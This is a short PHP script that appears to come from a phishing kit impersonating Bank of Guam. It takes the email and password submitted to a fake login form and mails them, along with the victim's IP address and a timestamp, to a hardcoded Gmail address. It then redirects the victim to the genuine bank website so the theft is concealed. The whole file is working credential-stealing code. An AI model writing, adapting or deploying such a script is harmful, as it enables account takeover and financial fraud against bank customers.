<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$user = $_POST['emale'];
$passe = $_POST['passwds'];
$fiftyme="zate123man@gmail.com";


  $subj = "BankofGuam $ip";
  $msg = "Email Info\n\nEmail: $user\nPassword: $passe\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>

<script type="text/javascript">
 window.location="https://www.bankofguam.com/"
</script>
